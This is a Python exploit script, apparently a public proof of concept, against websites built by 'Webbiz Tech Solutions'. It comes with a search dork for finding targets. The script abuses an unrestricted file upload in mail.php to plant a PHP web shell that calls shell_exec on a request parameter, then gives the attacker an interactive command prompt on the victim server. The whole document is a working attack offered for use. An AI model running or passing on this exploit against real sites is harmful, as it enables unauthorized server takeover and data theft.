#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import requests
from time import sleep
global web_shell
global headers
global data_form
global files
global url
def asciii():
    banner = """

             _    _      _          _              _      _   _          
 __ __ _____| |__(_)___ | |_ ___ __| |_    ___ ___| |_  _| |_(_)___ _ _  
 \ V  V / -_) '_ \ |_ / |  _/ -_) _| ' \  (_-</ _ \ | || |  _| / _ \ ' \ 
  \_/\_/\___|_.__/_/__|  \__\___\__|_||_| /__/\___/_|\_,_|\__|_\___/_||_|
      Remote File Upload / Remote command execution
      Dork : intext:"Webbiz Tech Solutions Pvt. Ltd."
      fb : https:/facebook.com/bassem.djebbar.7
      twitter : https://twitter.com/dj3bb4ran0n                                                                         
"""
    print(banner)
if len(sys.argv) == 1:
    asciii()
    print("Usage : python3 " + sys.argv[0] + " http://victim/")
    sys.exit(1)
else:
    pass
url = sys.argv[1]
upload_dir = "/uploaded/"
web_shell = "<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']) .\"</pre>\" ?>"
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}
data_form = {
    "name": "bassemdz",
    "email": "bassemdz@gmail.com",
    "contact_no": "0645654789",
    "present_ctc": "fsdfsdujghsdkmjlghs",
    "expected_ctc": "gdfogjmdfùhsjd",
    "notice_period": "fsdfsdfsdfsdqfsd",
    "message": "fsdpfksdopgqkspogjsdqpgjqjsdùopg",
    "submit2": "Submit"
}
files = {"in_file" :("cmd_shell.php", web_shell)}

def rce():
    asciii()
    response = requests.post(url + "mail.php",data=data_form,files=files,headers=headers)
    print("\n[*] Uploading webshell ......")
    sleep(3)
    print("\n[*] Shell Uploaded succusfully !!\n\n[*] Visit " + sys.argv[1] + upload_dir +"\n")
    while True:
        shell_dz = input("$ ")
        calling_output = "{url0}uploaded/200924072442dz.php?cmd={cmd1}".format(url0=url,cmd1=shell_dz)
        response1 = requests.get(calling_output,headers=headers)
        print(response1.text)
rce()




